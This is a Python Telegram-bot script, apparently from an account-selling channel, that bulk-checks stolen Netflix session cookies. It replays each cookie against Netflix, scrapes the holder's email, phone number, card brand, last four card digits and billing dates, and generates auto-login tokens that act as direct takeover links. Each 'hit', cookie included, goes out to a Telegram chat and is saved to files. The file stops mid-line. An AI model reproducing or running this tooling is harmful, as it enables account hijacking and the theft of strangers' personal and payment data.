import requests
import re
import time
import os
import threading
import tempfile
import zipfile
import shutil
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
import webbrowser

webbrowser.open("https://t.me/baroshoping")
init(autoreset=True)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN environment variable not set!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

class NetflixBulkChecker:
    def __init__(self, telegram_token=None, telegram_chat_id=None, threads=5):
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.threads = threads
        
        self.lock = threading.Lock()
        self.stats = {
            'total': 0,
            'checked': 0,
            'hits': 0,
            'premium_hits': 0,
            'bad': 0,
            'errors': 0,
            'start_time': time.time()
        }
        
        self.premium_accounts = []
    
    def send_telegram(self, message):
        if not self.telegram_token or not self.telegram_chat_id:
            return
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {'chat_id': self.telegram_chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
            requests.post(url, data=data, timeout=10)
        except:
            pass
    
    def get_country_flag(self, country_code):
        flags = {'US': '🇺🇸', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'ES': '🇪🇸', 'IT': '🇮🇹', 'TR': '🇹🇷', 'BR': '🇧🇷', 'JP': '🇯🇵', 'KR': '🇰🇷', 'IN': '🇮🇳', 'CA': '🇨🇦', 'AU': '🇦🇺', 'MX': '🇲🇽', 'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'RU': '🇷🇺', 'AR': '🇦🇷', 'CL': '🇨🇱', 'CO': '🇨🇴', 'PE': '🇵🇪', 'AE': '🇦🇪', 'SA': '🇸🇦', 'EG': '🇪🇬', 'ZA': '🇿🇦', 'ID': '🇮🇩', 'MY': '🇲🇾', 'SG': '🇸🇬', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'}
        return flags.get(country_code.upper(), '🌍')
    
    def get_country_name(self, country_code):
        names = {'US': 'United States', 'GB': 'United Kingdom', 'DE': 'Germany', 'FR': 'France', 'ES': 'Spain', 'IT': 'Italy', 'TR': 'Turkey', 'BR': 'Brazil', 'JP': 'Japan', 'KR': 'South Korea', 'IN': 'India', 'CA': 'Canada', 'AU': 'Australia', 'MX': 'Mexico', 'NL': 'Netherlands', 'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 'PL': 'Poland', 'RU': 'Russia', 'AR': 'Argentina', 'CL': 'Chile', 'CO': 'Colombia', 'PE': 'Peru', 'AE': 'United Arab Emirates', 'SA': 'Saudi Arabia', 'EG': 'Egypt', 'ZA': 'South Africa', 'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore', 'TH': 'Thailand', 'VN': 'Vietnam', 'PH': 'Philippines'}
        return names.get(country_code.upper(), country_code)
    
    def parse_netscape_cookie(self, cookie_text):
        cookie_text = cookie_text.strip()
        if cookie_text.startswith("NetflixId="):
            return {"NetflixId": cookie_text.split("NetflixId=", 1)[1].strip()}
        cookies = {}
        lines = cookie_text.split('\n')
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split('\t')
            if len(parts) >= 7:
                name = parts[5]
                value = parts[6]
                cookies[name] = value
        return cookies
    
    def decode_unicode(self, text):
        if not text:
            return text
        try:
            if '\\u' in text:
                text = text.encode('utf-8').decode('unicode-escape')
        except:
            pass
        try:
            if '\\x' in text:
                text = bytes(text, 'utf-8').decode('unicode-escape')
        except:
            pass
        return text
    
    def generate_nftoken(self, cookies_dict):
        try:
            session = requests.Session()
            for name, value in cookies_dict.items():
                session.cookies.set(name, value, domain='.netflix.com', path='/')
            
            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
            
            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
            
            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                    return data['data']['createAutoLoginToken']
            return None
        except:
            return None
    
    def check_cookie(self, cookie_text, source_name):
        session = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Pragma': 'no-cache', 'Accept': '*/*'}
        
        try:
            cookies = self.parse_netscape_cookie(cookie_text)
            if not cookies:
                return None
            
            cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
            for name, value in cookies.items():
                session.cookies.set(name, value, domain='.netflix.com', path='/')

            response = session.get('https://www.netflix.com/account/membership', headers=headers, timeout=20, allow_redirects=True)
            
            if 'login' in response.url.lower():
                return None
            
            html = response.text
            captures = {}
            
            country_match = re.search(r'"countryOfSignup":"([^"]+)"', html)
            if country_match:
                captures['country_code'] = country_match.group(1)
                captures['country'] = self.get_country_name(captures['country_code'])
            
            email_match = re.search(r'"emailAddress":"([^"]+)"', html)
            if email_match:
                captures['email'] = self.decode_unicode(email_match.group(1))
            
            plan_match = re.search(r'\{"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
            if plan_match:
                captures['plan'] = self.decode_unicode(plan_match.group(1))
            
            price_match = re.search(r'"currentMemberPlanPriceAmount":\{"fieldType":"String","value":"([^"]+)"\}', html)
            if price_match:
                captures['price'] = self.decode_unicode(price_match.group(1))
            
            member_match = re.search(r'"memberSinceDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
            if member_match:
                captures['member_since'] = self.decode_unicode(member_match.group(1))
            
            billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
            if billing_match:
                captures['next_billing'] = self.decode_unicode(billing_match.group(1))
            
            payment_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
            if payment_match:
                captures['payment_method'] = payment_match.group(1)
            
            brand_match = re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html)
            if brand_match:
                captures['card_brand'] = brand_match.group(1)
            
            card_match = re.search(r'"lastFourDigits":"([^"]+)"', html)
            if card_match:
                captures['card_last4'] = card_match.group(1)
            
            phone_match = re.search(r'"phoneNumber":"([^"]+)"', html)
            if phone_match:
                captures['phone'] = self.decode_unicode(phone_match.group(1))
            
            phone_verified = re.search(r'"isPhoneVerified":(true|false)', html)
            if phone_verified:
                captures['phone_verified'] = phone_verified.group(1) == 'true'
            
            streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html)
            if streams_match:
                captures['max_streams'] = streams_match.group(1)
            
            quality_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
            if quality_match:
                quality = quality_match.group(1)
                captures['video_quality'] = 'HD720p' if quality == 'hd' else 'UHD 4K' if quality == 'uhd' else quality.upper()
            
            extra_match = re.search(r'"extraMemberSlots":(\d+)', html)
            if extra_match:
                captures['extra_member'] = 'Yes' if int(extra_match.group(1)) > 0 else 'No'
            else:
                captures['extra_member'] = 'Unknown'
            
            profiles = re.findall(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)
            if profiles:
                captures['profiles'] = [self.decode_unicode(p) for p in profiles]
                captures['profile_count'] = len(profiles)
                captures['name'] = captures['profiles'][0]
            
            if '"membershipStatus":"CURRENT_MEMBER"' not in html:
                return None
            
            nftoken = self.generate_nftoken(cookies)
            if nftoken:
                captures['nftoken'] = nftoken
                captures['login_url'] = f"https://netflix.com/account?nftoken={nftoken}"
            
            captures['cookie'] = cookie_str
            captures['source'] = source_name
            
            return captures
            
        except:
            return None
    
    def process_cookie_file(self, cookie_file, index):
        try:
            with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
                cookie_text = f.read()
        except:
            with self.lock:
                self.stats['errors'] += 1
            return
        
        source_name = f"{os.path.basename(os.path.dirname(cookie_file))}_cookie_{index}"
        result = self.check_cookie(cookie_text, source_name)
        
        with self.lock:
            self.stats['checked'] += 1
            if result:
                self.stats['hits'] += 1
                self.stats['premium_hits'] += 1
                self.premium_accounts.append(result)
                
                os.makedirs('hits', exist_ok=True)
                filename = f"[{result.get('country_code', 'XX')}] [{result.get('email', 'Unknown')}] - {result.get('plan', 'Unknown')}.txt"
                with open(f"hits/{filename}", 'w', encoding='utf-8') as f:
                    f.write(cookie_text)
                
                self.send_hit_to_telegram(result, len(self.premium_accounts))
                print(f"{Fore.GREEN}[✓] HIT #{len(self.premium_accounts)}: {result.get('email', 'Unknown')} - {result.get('plan', 'Unknown')}{Style.RESET_ALL}")
            else:
                self.stats['bad'] += 1
    
    def send_hit_to_telegram(self, result, hit_number):
        country_flag = self.get_country_flag(result.get('country_code', 'XX'))
        full_cookie = result.get('cookie', 'N/A')
        
        message = f"""
🔹 <b>PREMIUM ACCOUNT #{hit_number}</b>

📁 <b>Source:</b> <code>{result.get('source', 'Unknown')}</code>
👤 <b>Name:</b> {result.get('name', 'Unknown')}
🌍 <b>Country:</b> {result.get('country', 'Unknown')} {country_flag}
📋 <b>Plan:</b> {result.get('plan', 'Unknown')}
💰 <b>Price:</b> {result.get('price', 'N/A')}
📅 <b>Member Since:</b> {result.get('member_since', 'N/A')}
📅 <b>Next Billing Date:</b> {result.get('next_billing', 'N/A')}
💳 <b>Payment Method:</b> {result.get('payment_method', 'CC')}
🏦 <b>Card Brand:</b> {result.get('card_brand', 'N/A')}
🔢 <b>Last 4 Digits:</b> {result.get('card_last4', 'N/A')}
📞 <b>Phone:</b> {result.get('phone', 'N/A')}
✅ <b>Phone Verified:</b> {'Yes' if result.get('phone_verified') else 'No'}
🎥 <b>Video Quality:</b> {result.get('video_quality', 'HD')}
📺 <b>Max Streams:</b> {result.get('max_streams', '1')}
👥 <b>Connected Profiles:</b> {result.get('profile_count', 0)}
📧 <b>Email:</b> <code>{result.get('email', 'Unknown')}</code>
🔓 <b>Extra Member Slot:</b> {result.get('extra_member', 'Unknown')}

🔗 <b>Direct Login URL:</b>
{result.get('login_url', 'N/A')}

🍪 <b>Cookie:</b>
<code>{full_cookie}</code>

<i>by @Baron_Saplar // @baroshoping</i>
"""
        self.send_telegram(message)
    
    def display_stats(self):
        while self.stats['checked'] < self.stats['total']:
            elapsed = time.time() - self.stats['start_time']
            cpm = int((self.stats['checked'] / elapsed) * 60) if elapsed > 0 else 0
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"{Fore.YELLOW}NETFLIX BULK COOKIE CHECKER{Style.RESET_ALL}")
            print(f"\n{Fore.WHITE}Progress: {self.stats['checked']}/{self.stats['total']} | CPM: {cpm}")
            print(f"{Fore.GREEN}Premium Hits: {self.stats['premium_hits']}")
            print(f"{Fore.RED}Bad: {self.stats['bad']}")
            print(f"{Fore.MAGENTA}Errors: {self.stats['errors']}")
            if self.premium_accounts:
                print(f"\n{Fore.CYAN}Recent Hits:{Style.RESET_ALL}")
                for hit in self.premium_accounts[-3:]:
                    print(f"  {Fore.GREEN}{hit['email']} - {hit['plan']} - {hit['country']}{Style.RESET_ALL}")
            time.sleep(2)
    
    def start(self, cookies_folder):
        cookie_files = []
        for root, dirs, files in os.walk(cookies_folder):
            for filename in files:
                filepath = os.path.join(root, filename)
                cookie_files.append(filepath)
        
        if not cookie_files:
            print(f"{Fore.RED}No cookie files found!{Style.RESET_ALL}")
            return
        
        self.stats['total'] = len(cookie_files)
        print(f"{Fore.YELLOW}Starting Netflix Bulk Checker{Style.RESET_ALL}")
        print(f"Total Cookies: {len(cookie_files)}")
        print(f"Threads: {self.threads}")
        print(f"Telegram: Enabled ✓")
        
        display_thread = threading.Thread(target=self.display_stats, daemon=True)
        display_thread.start()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for i, cookie_file in enumerate(cookie_files, 1):
                future = executor.submit(self.process_cookie_file, cookie_file, i)
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result(timeout=30)
                except:
                    with self.lock:
                        self.stats['errors'] += 1
        
        self.print_final_summary()
    
    def print_final_summary(self):
        elapsed = time.time() - self.stats['start_time']
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.YELLOW}CHECKING COMPLETE{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"Total Checked: {self.stats['checked']}")
        print(f"{Fore.GREEN}Premium Hits: {self.stats['premium_hits']}{Style.RESET_ALL}")
        print(f"{Fore.RED}Bad: {self.stats['bad']}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}Errors: {self.stats['errors']}{Style.RESET_ALL}")
        print(f"Time: {int(elapsed)} seconds")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        if self.premium_accounts:
            self.save_premium_summary()
    
    def save_premium_summary(self):
        os.makedirs('results', exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        with open(f'results/premium_accounts_{timestamp}.txt', 'w', encoding='utf-8') as f:
            f.write("="*80 + "\n")
            f.write(f"💎 PREMIUM ACCOUNTS DETAILS (Only Premium):\n")
            f.write("="*80 + "\n\n")
            for i, acc in enumerate(self.premium_accounts, 1):
                country_flag = self.get_country_flag(acc.get('country_code', 'XX'))
                f.write(f"🔹 PREMIUM ACCOUNT #{i}\n")
                f.write(f"📁 Source: {acc.get('source', 'Unknown')}\n")
                f.write(f"👤 Name: {acc.get('name', 'Unknown')}\n")
                f.write(f"🌍 Country: {acc.get('country', 'Unknown')} {country_flag}\n")
                f.write(f"📋 Plan: {acc.get('plan', 'Unknown')}\n")
                f.write(f"💰 Price: {acc.get('price', 'N/A')}\n")
                f.write(f"📅 Member Since: {acc.get('member_since', 'N/A')}\n")
                f.write(f"📅 Next Billing Date: {acc.get('next_billing', 'N/A')}\n")
                f.write(f"💳 Payment Method: {acc.get('payment_method', 'CC')}\n")
                f.write(f"🏦 Card Brand: {acc.get('card_brand', 'N/A')}\n")
                f.write(f"🔢 Last 4 Digits: {acc.get('card_last4', 'N/A')}\n")
                f.write(f"📞 Phone: {acc.get('phone', 'N/A')}\n")
                f.write(f"✅ Phone Verified: {'Yes' if acc.get('phone_verified') else 'No'}\n")
                f.write(f"🎥 Video Quality: {acc.get('video_quality', 'HD')}\n")
                f.write(f"📺 Max Streams: {acc.get('max_streams', '1')}\n")
                f.write(f"👥 Connected Profiles: {acc.get('profile_count', 0)}\n")
                f.write(f"📧 Email: {acc.get('email', 'Unknown')}\n")
                f.write(f"🔓 Extra Member Slot: {acc.get('extra_member', 'Unknown')}\n")
                f.write(f"🔗 Direct Login URL: {acc.get('login_url', 'N/A')}\n")
                f.write(f"🍪 Cookie: {acc.get('cookie', '')}\n")
                f.write("-"*80 + "\n\n")
        print(f"{Fore.GREEN}Premium summary saved to results/ folder{Style.RESET_ALL}")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "👋 Send me a **ZIP file** containing your Netflix cookie .txt files.\nOne account per .txt file.")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not message.document.file_name.lower().endswith('.zip'):
        bot.reply_to(message, "❌ Please send a **.zip** file containing your .txt cookie files.")
        return

    bot.reply_to(message, "✅ ZIP received. Extracting and starting check...")

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with tempfile.TemporaryDirectory() as temp_dir:
            zip_path = os.path.join(temp_dir, "cookies.zip")
            with open(zip_path, 'wb') as f:
                f.write(downloaded_file)

            extract_dir = os.path.join(temp_dir, "cookies")
            os.makedirs(extract_dir, exist_ok=True)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)

            checker = NetflixBulkChecker(telegram_token=BOT_TOKEN, telegram_chat_id=str(message.chat.id), threads=10)
            checker.start(extract_dir)

            if os.path.exists("hits") and os.listdir("hits"):
                hits_zip = os.path.join(temp_dir, "hits.zip")
                with zipfile.ZipFile(hits_zip, 'w') as z:
                    for root, _, files in os.walk("hits"):
                        for file in files:
                            z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), "hits"))
                
                with open(hits_zip, 'rb') as f:
                    bot.send_document(message.chat.id, f, caption="🎉 All hits saved!\nHere is your hits.zip")
                
                shutil.rmtree("hits", ignore_errors=True)
            else:
                bot.reply_to(message, "❌ No hits found.")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

if 
